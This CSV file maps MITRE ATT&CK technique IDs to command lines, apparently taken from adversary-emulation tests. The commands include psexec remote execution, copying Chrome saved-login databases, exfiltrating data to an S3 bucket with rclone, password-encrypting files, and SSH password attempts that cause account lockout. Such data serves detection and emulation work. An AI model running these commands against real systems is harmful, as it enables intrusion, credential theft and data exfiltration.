mitre_id,command
T1569,psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}' # id_3955
T1133,"$extlist = #{extension_id} foreach ($extension in $extlist) { new-item -path hklm:\software\wow6432node\google\chrome\extensions\$extension -force new-itemproperty -path ""hklm:\software\wow6432node\google\chrome\extensions\$extension"" -name ""update_url"" -value ""https://clients2.google.com/service/update2/crx"" -propertytype ""string"" -force} start chrome start-sleep -seconds 30 stop-process -name ""chrome"" # id_5234"
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"" # id_9390"
T1613,podman build -t t1613 $pathtoatomicsfolder/t1613/src/ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613) # id_4884
T1486,$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}
T1567,"write-host ""deploying aws infrastructure... "" -nonewline $awsaccesskey = ""#{aws_access_key}"" $awssecretkey = ""#{aws_secret_key}"" cd pathtoatomicsfolder/t1567.002/src/ if ($awsaccesskey -eq """" -or $awssecretkey -eq """") { $env:aws_profile = ""#{aws_profile}"" } else { $env:aws_access_key_id = ""$awsaccesskey"" $env:aws_secret_access_key = ""$awssecretkey"" } $null = pathtoatomicsfolder/../externalpayloads/t1567.002/terraform-v*/terraform init $null = pathtoatomicsfolder/../externalpayloads/t1567.002/terraform-v*/terraform apply -var ""aws_region=#{aws_region}"" -auto-approve write-host ""done!"" write-host ""generating rclone config... "" -nonewline $config = @"" [exfils3] type = s3 provider = aws env_auth = true region = #{aws_region} ""@ $config | out-file -filepath ""pathtoatomicsfolder/../externalpayloads/t1567.002/rclone.conf"" -encoding ascii write-host ""done!"" write-host ""exfiltrating data... "" -nonewline $bucket = ""$(pathtoatomicsfolder/../externalpayloads/t1567.002/terraform-v*/terraform output bucket)"".replace(""`"""","""") cd pathtoatomicsfolder/../externalpayloads/t1567.002/rclone-v* $null = ./rclone copy --max-size 1700k ""pathtoatomicsfolder/../externalpayloads/t1567.002/data/"" exfils3:$bucket --config ""pathtoatomicsfolder/../externalpayloads/t1567.002/rclone.conf"" write-host ""done!""   "
T1555,"cp ~/library/""application support/google/chrome/default/login data"" ""/tmp/t1555.003_login data"" cp ~/library/""application support/google/chrome/default/login data for account"" ""/tmp/t1555.003_login data for account"""
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')"" # id_3521"
T1570,new-smbmapping -remotepath '#{remote_path}' -transporttype quic -skipcertificatecheck copy '#{local_file}' 'z:\'  
T1110,"$lockout_threshold = [int]""#{lockout_threshold}"" for ($var = 1; $var -le $lockout_threshold; $var++) { #{plink_file} -ssh ""#{vm_host}"" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002 }   "
